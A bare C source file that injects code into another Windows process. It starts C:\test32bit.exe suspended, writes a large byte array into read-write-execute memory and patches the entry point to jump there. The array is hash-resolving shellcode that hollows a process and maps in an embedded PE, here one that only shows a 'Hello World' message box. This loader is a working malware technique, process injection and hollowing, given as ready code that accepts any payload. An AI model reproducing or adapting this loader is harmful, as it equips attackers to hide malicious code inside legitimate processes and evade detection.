
#include<windows.h>
#include<stdio.h>
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PVOID                 Ldr;
  PVOID  ProcessParameters;
  BYTE                          Reserved4[104];
  PVOID                         Reserved5[52];
  PVOID PostProcessInitRoutine;
  BYTE                          Reserved6[128];
  PVOID                         Reserved7[1];
  ULONG                         SessionId;
} PEB, *PPEB;
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;
//packed file displaying messagebox
BYTE arr[]="\x55\x8B\xEC\x81\xEC\x88\x03\x00\x00\x53\x56\x57\xFC\xE9\xFF\x03\x00\x00\x5B\xE9\xB4\x00\x00\x00\x33\xFF\x8B\x44\x24\x04\x33\xDB\x66\x03\x58\x3C\x03\xC3\x66\x33\xDB\x83\xC0\x78\x8B\x00\x03\x44\x24\x04\x3B\x7C\x24\x08\x74\x39\x8B\x58\x20\x03\x5C\x24\x04\x8B\x48\x18\x33\xD2\x33\xC0\x83\xEB\x04\x85\xC9\x74\x56\x83\xC3\x04\x83\xC2\x02\x8B\x33\x03\x74\x24\x04\x33\xFF\x33\xC0\xAC\x84\xC0\x74\x07\xC1\xCF\x0D\x03\xF8\xEB\xF2\x3B\x7C\x24\x08\x75\x2F\xEB\xA9\x8B\x58\x24\x03\x5C\x24\x04\x03\xDA\x33\xC9\x66\x8B\x0B\x8B\x58\x1C\x03\x5C\x24\x04\x03\xC9\x03\xC9\x03\xD9\x83\xEB\x04\x8B\x1B\x8B\x44\x24\x04\x03\xC3\x83\xC4\x0C\xFF\x64\x24\xF4\x33\xC0\x49\xEB\xA6\xC3\x33\xC0\xB0\x30\x64\x8B\x00\x8B\x40\x0C\x8B\x40\x14\x8B\x00\x8B\x40\x10\xC3\x33\xC0\xB0\x30\x64\x8B\x00\x8B\x40\x0C\x8B\x40\x14\x8B\x00\x8B\x00\x8B\x40\x10\xC3\xC7\x85\x78\xFC\xFF\xFF\x02\x00\x01\x00\xC7\x45\x88\x01\x00\x00\x00\xC7\x45\x8C\x10\x00\x00\x00\xC7\x45\x90\x02\x00\x00\x00\xC7\x45\x94\x20\x00\x00\x00\xC7\x45\x98\x04\x00\x00\x00\xC7\x45\x9C\x40\x00\x00\x00\xC7\x45\xA0\x04\x00\x00\x00\xC7\x45\xA4\x40\x00\x00\x00\x83\x65\xF4\x00\x83\x65\xF0\x00\x89\x5D\xEC\x68\x88\xFA\x4D\xDB\xE8\x94\xFF\xFF\xFF\x50\xE8\xEF\xFE\xFF\xFF\x89\x45\xB4\x68\xD0\x4F\xD0\xF2\xE8\x6E\xFF\xFF\xFF\x50\xE8\xDC\xFE\xFF\xFF\x89\x45\xA8\x68\xED\x4A\x3D\xD3\xE8\x5B\xFF\xFF\xFF\x50\xE8\xC9\xFE\xFF\xFF\x89\x45\xB8\x68\xC2\xA5\xEF\x3D\xE8\x48\xFF\xFF\xFF\x50\xE8\xB6\xFE\xFF\xFF\x89\x45\xC0\x68\xC2\xA4\xD0\xC5\xE8\x35\xFF\xFF\xFF\x50\xE8\xA3\xFE\xFF\xFF\x89\x45\xE4\x68\x89\x4D\x3F\xBC\xE8\x22\xFF\xFF\xFF\x50\xE8\x90\xFE\xFF\xFF\x89\x45\xC8\x68\xF3\xE3\x38\xE9\xE8\x0F\xFF\xFF\xFF\x50\xE8\x7D\xFE\xFF\xFF\x89\x45\xCC\x68\xF5\xE3\x38\x69\xE8\xFC\xFE\xFF\xFF\x50\xE8\x6A\xFE\xFF\xFF\x89\x45\xC4\x68\x53\xBC\x2C\x79\xE8\xE9\xFE\xFF\xFF\x50\xE8\x57\xFE\xFF\xFF\x89\x45\xD0\x68\xF8\x46\x4A\xCB\xE8\xD6\xFE\xFF\xFF\x50\xE8\x44\xFE\xFF\xFF\x89\x45\xBC\x64\xA1\x30\x00\x00\x00\x8B\x40\x10\x8B\x40\x3C\x89\x45\xB0\x33\xC0\xB9\x10\x00\x00\x00\x8D\x7D\xD4\xAA\x49\x83\xF9\x00\x75\xF9\xB9\x44\x00\x00\x00\x8D\xBD\x44\xFF\xFF\xFF\xAA\x49\x83\xF9\x00\x75\xF9\xC7\x85\x44\xFF\xFF\xFF\x44\x00\x00\x00\x33\xC0\x66\x89\x85\x74\xFF\xFF\xFF\x6A\x00\x8D\x45\xD4\x50\x8D\x85\x44\xFF\xFF\xFF\x50\x6A\x00\x6A\x00\x6A\x04\x6A\x00\x6A\x00\x6A\x00\x6A\x00\xFF\x75\xB0\x6A\x00\xFF\x55\xB4\x83\x7D\xD4\x00\x0F\x84\xC1\x01\x00\x00\x8D\x85\x78\xFC\xFF\xFF\x50\xFF\x75\xD8\xFF\x55\xCC\x83\xBD\x1C\xFD\xFF\xFF\x00\x0F\x84\x9F\x01\x00\x00\x8D\x45\xE8\x50\x6A\x04\x8D\x45\xF8\x50\x8B\x85\x1C\xFD\xFF\xFF\x83\xC0\x08\x50\xFF\x75\xD4\xFF\x55\xC0\x83\x7D\xF8\x00\x0F\x84\x7B\x01\x00\x00\xFF\x75\xF8\xFF\x75\xD4\xFF\x55\xA8\x85\xC0\x0F\x8C\x6A\x01\x00\x00\x8B\x45\xEC\x8B\x4D\xEC\x03\x48\x3C\x89\x4D\xF4\x8B\x45\xF4\x8B\x40\x34\x89\x45\xF8\x8B\x45\xF4\x8B\x40\x50\x89\x45\xFC\x6A\x04\x68\x00\x30\x00\x00\x8D\x45\xFC\x50\x6A\x00\x8D\x45\xF8\x50\xFF\x75\xD4\xFF\x55\xB8\x83\x7D\xF8\x00\x0F\x84\x2B\x01\x00\x00\x83\x7D\xFC\x00\x0F\x84\x21\x01\x00\x00\x8D\x45\xE8\x50\x8B\x45\xF4\xFF\x70\x54\xFF\x75\xEC\xFF\x75\xF8\xFF\x75\xD4\xFF\x55\xE4\x85\xC0\x0F\x85\x03\x01\x00\x00\x8B\x45\xF4\x0F\xB7\x40\x14\x8B\x4D\xF4\x8D\x44\x01\x18\x89\x45\xF0\x83\x65\xFC\x00\xEB\x07\x8B\x45\xFC\x40\x89\x45\xFC\x8B\x45\xF4\x0F\xB7\x40\x06\x39\x45\xFC\x0F\x83\x81\x00\x00\x00\x8B\x45\xFC\x6B\xC0\x28\x8B\x4D\xF0\x8B\x55\xF8\x03\x54\x01\x0C\x89\x55\xAC\x8D\x45\xE8\x50\x8B\x45\xFC\x6B\xC0\x28\x8B\x4D\xF0\xFF\x74\x01\x10\x8B\x45\xFC\x6B\xC0\x28\x8B\x4D\xF0\x8B\x55\xEC\x03\x54\x01\x14\x52\x8B\x45\xFC\x6B\xC0\x28\x8B\x4D\xF0\x8B\x55\xF8\x03\x54\x01\x0C\x52\xFF\x75\xD4\xFF\x55\xE4\x8D\x45\xE8\x50\x8B\x45\xFC\x6B\xC0\x28\x8B\x4D\xF0\x8B\x44\x01\x24\xC1\xE8\x1D\xFF\x74\x85\x88\x8B\x45\xFC\x6B\xC0\x28\x8B\x4D\xF0\x8D\x44\x01\x08\x50\x8D\x45\xAC\x50\xFF\x75\xD4\xFF\x55\xC8\xE9\x68\xFF\xFF\xFF\x8B\x45\xF4\x0F\xB7\x40\x06\x39\x45\xFC\x75\x48\x8D\x45\xE8\x50\x6A\x04\x8D\x45\xF8\x50\x8B\x85\x1C\xFD\xFF\xFF\x83\xC0\x08\x50\xFF\x75\xD4\xFF\x55\xE4\x85\xC0\x75\x2A\x8B\x45\xF4\x8B\x4D\xF8\x03\x48\x28\x89\x8D\x28\xFD\xFF\xFF\x8D\x85\x78\xFC\xFF\xFF\x50\xFF\x75\xD8\xFF\x55\xC4\x85\xC0\x75\x0A\xFF\x75\xD8\xFF\x55\xBC\xEB\x0A\xEB\x08\x6A\x00\xFF\x75\xD4\xFF\x55\xD0\x6A\x00\x6A\xFF\xFF\x55\xD0\xE8\xFC\xFB\xFF\xFF\x4D\x5A\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x0E\x1F\xBA\x0E\x00\xB4\x09\xCD\x21\xB8\x01\x4C\xCD\x21\x54\x68\x69\x73\x20\x70\x72\x6F\x67\x72\x61\x6D\x20\x63\x61\x6E\x6E\x6F\x74\x20\x62\x65\x20\x72\x75\x6E\x20\x69\x6E\x20\x44\x4F\x53\x20\x6D\x6F\x64\x65\x2E\x0D\x0D\x0A\x24\x00\x00\x00\x00\x00\x00\x00\x50\x45\x00\x00\x4C\x01\x04\x00\x3C\x21\xC3\x50\x00\x00\x00\x00\x00\x00\x00\x00\xE0\x00\x0F\x03\x0B\x01\x02\x16\x00\x02\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x10\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x50\x00\x00\x00\x04\x00\x00\x29\xD0\x00\x00\x02\x00\x00\x00\x00\x00\x20\x00\x00\x10\x00\x00\x00\x00\x10\x00\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x30\x40\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2E\x74\x65\x78\x74\x00\x00\x00\x48\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x30\x60\x2E\x72\x64\x61\x74\x61\x00\x00\x18\x00\x00\x00\x00\x20\x00\x00\x00\x02\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x30\x40\x2E\x65\x68\x5F\x66\x72\x61\x6D\x38\x00\x00\x00\x00\x30\x00\x00\x00\x02\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x30\x40\x2E\x69\x64\x61\x74\x61\x00\x00\x58\x00\x00\x00\x00\x40\x00\x00\x00\x02\x00\x00\x00\x0A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x30\xC0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\x89\xE5\x83\xEC\x18\xC7\x44\x24\x0C\x00\x00\x00\x00\xC7\x44\x24\x08\x00\x20\x40\x00\xC7\x44\x24\x04\x09\x20\x40\x00\xC7\x04\x24\x00\x00\x00\x00\xE8\x06\x00\x00\x00\x83\xEC\x10\xC9\xC3\x90\xFF\x25\x30\x40\x40\x00\x90\x90\xFF\xFF\xFF\xFF\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4D\x65\x73\x73\x61\x67\x65\x21\x00\x48\x65\x6C\x6C\x6F\x20\x57\x6F\x72\x6C\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x01\x7A\x52\x00\x01\x7C\x08\x01\x1B\x0C\x04\x04\x88\x01\x00\x00\x1C\x00\x00\x00\x1C\x00\x00\x00\xE0\xDF\xFF\xFF\x2F\x00\x00\x00\x00\x41\x0E\x08\x85\x02\x42\x0D\x05\x6B\xC5\x0C\x04\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x40\x00\x00\x30\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38\x40\x00\x00\x00\x00\x00\x00\x38\x40\x00\x00\x00\x00\x00\x00\xB2\x01\x4D\x65\x73\x73\x61\x67\x65\x42\x6F\x78\x41\x00\x00\x00\x00\x40\x00\x00\x55\x53\x45\x52\x33\x32\x2E\x64\x6C\x6C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
main()
{

	char path[]="C:\\test32bit.exe";
	
	SIZE_T pd,bytes;
	PROCESS_INFORMATION pi={0};
	STARTUPINFO si={0};
	PROCESS_BASIC_INFORMATION pib;
	CreateProcess(NULL,path,0,0,0,0x4,0,0,&si,&pi);
	DWORD addr=(DWORD)VirtualAllocEx(pi.hProcess,0,sizeof(arr),0x3000,0x40);
	DWORD temp2;
	DWORD addr2,addr3,temp;
	FARPROC query=GetProcAddress(GetModuleHandle("ntdll"),"ZwQueryInformationProcess");
	query(pi.hProcess,0,&pib,sizeof(PROCESS_BASIC_INFORMATION),&pd);
	LPVOID random = pib.PebBaseAddress;
	random=random+16;
	ReadProcessMemory(pi.hProcess,(LPVOID)random,(LPVOID)&addr2,4,&bytes);
	addr3=addr2+0x3c;
	ReadProcessMemory(pi.hProcess,(LPVOID)addr3,(LPVOID)&temp2,4,&bytes);
	addr3=addr2+temp2+0x28;
	ReadProcessMemory(pi.hProcess,(LPVOID)addr3,(LPVOID)&temp,4,&bytes);
	addr3=addr2+temp;
	BYTE arr123[10]="\x68\x00\x00\x00\x00\xc3";
	WriteProcessMemory((HANDLE)pi.hProcess,(LPVOID)addr,arr,sizeof(arr),&pd);
	memcpy(&arr123[1],(LPVOID)&addr,4);
	WriteProcessMemory((HANDLE)pi.hProcess,(LPVOID)addr3,arr123,6,&bytes);
	ResumeThread(pi.hThread);
}
